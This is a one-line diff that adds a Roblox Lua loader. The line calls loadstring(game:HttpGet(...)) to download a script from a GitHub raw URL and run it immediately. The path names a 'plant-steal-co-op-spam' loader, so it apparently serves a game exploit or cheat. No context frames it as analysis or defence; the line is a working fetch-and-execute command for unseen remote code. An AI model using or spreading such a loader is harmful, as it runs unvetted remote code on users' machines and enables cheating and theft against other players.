@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/HarmonicPigeonExalt/loaders/main/loaders/plant-steal-co-op-spam7-rmgdx9agm7jhzu.lua"))()
